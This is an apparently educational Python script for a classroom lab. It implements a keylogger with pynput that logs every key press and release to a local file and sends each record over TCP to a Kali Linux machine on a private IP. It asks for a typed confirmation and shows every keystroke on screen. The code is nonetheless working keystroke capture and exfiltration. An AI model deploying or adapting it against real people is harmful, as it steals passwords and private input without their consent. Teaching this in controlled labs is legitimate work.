"""Actividad 03 - No presiones Esc... todavía.

Ampliación del código base de clase para un laboratorio propio y autorizado.
Registra los eventos en un archivo local y envía una copia a Kali Linux.
"""

from datetime import datetime
import socket
from time import perf_counter

from pynput.keyboard import Key, Listener


# IMPORTANTE: cambia esta dirección por la IP real de tu máquina Kali.
IP_KALI = "192.168.56.101"
PUERTO = 5050
ARCHIVO_LOCAL = "Eventos.txt"

contador_eventos = 0
instante_anterior = None
conexion_kali = None


def generar_evento():
    """Crea un identificador consecutivo como evento_001."""
    global contador_eventos
    contador_eventos += 1
    return f"evento_{contador_eventos:03d}"


def describir_tecla(key):
    """Obtiene el carácter de una tecla o el nombre de una tecla especial."""
    try:
        if key.char is not None:
            return repr(key.char)
    except AttributeError:
        pass
    return str(key)


def conectar_con_kali():
    """Abre la conexión TCP con el receptor de Kali."""
    global conexion_kali

    try:
        conexion_kali = socket.create_connection((IP_KALI, PUERTO), timeout=3)
        conexion_kali.settimeout(None)
        print(f"Conexión establecida con Kali: {IP_KALI}:{PUERTO}")
        return True
    except OSError as error:
        conexion_kali = None
        print(f"No fue posible conectar con Kali: {error}")
        print("El registro local continuará funcionando.")
        return False


def enviar_a_kali(registro):
    """Transmite un registro; si la red falla, conserva el archivo local."""
    global conexion_kali

    if conexion_kali is None and not conectar_con_kali():
        return False

    try:
        conexion_kali.sendall((registro + "\n").encode("utf-8"))
        return True
    except OSError as error:
        print(f"Error de envío: {error}")
        conexion_kali.close()
        conexion_kali = None
        return False


def guardar_evento(tipo_evento, key):
    """Asocia, guarda y transmite el evento generado."""
    global instante_anterior

    instante_actual = perf_counter()
    if instante_anterior is None:
        diferencia_ms = 0
    else:
        diferencia_ms = round((instante_actual - instante_anterior) * 1000)
    instante_anterior = instante_actual

    fecha_hora = datetime.now().astimezone().isoformat(timespec="milliseconds")
    evento = generar_evento()
    tecla = describir_tecla(key)

    registro = (
        f"{fecha_hora} | [{tipo_evento}] | {evento} | "
        f"tecla={tecla} | delta_ms={diferencia_ms}"
    )

    # El modo "a" agrega información sin borrar eventos anteriores.
    with open(ARCHIVO_LOCAL, "a", encoding="utf-8") as archivo:
        archivo.write(registro + "\n")

    enviado = enviar_a_kali(registro)
    estado = "ENVIADO" if enviado else "SOLO_LOCAL"
    print(f"[{estado}] {registro}")


def on_press(key):
    """Callback que se ejecuta cuando una tecla es presionada."""
    try:
        print(f"Tecla alfanumérica presionada: {key.char}")
    except AttributeError:
        print(f"Tecla especial presionada: {key}")

    guardar_evento("PRESS", key)


def on_release(key):
    """Callback que se ejecuta cuando una tecla es liberada."""
    print(f"Tecla liberada: {key}")
    guardar_evento("RELEASE", key)

    if key == Key.esc:
        print("Esc detectado. El programa finalizará.")
        return False

    return None


def main():
    global conexion_kali

    print("ACTIVIDAD 03 - LABORATORIO CONTROLADO")
    print("No escribas contraseñas ni datos personales.")
    print("Presiona Esc para finalizar la prueba.")

    confirmacion = input("Escribe LABORATORIO para comenzar: ").strip()
    if confirmacion != "LABORATORIO":
        print("La prueba no fue iniciada.")
        return

    conectar_con_kali()

    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    finally:
        if conexion_kali is not None:
            conexion_kali.close()
        print(f"Los eventos permanecen guardados en {ARCHIVO_LOCAL}")


if __name__ == "__main__":
    main()
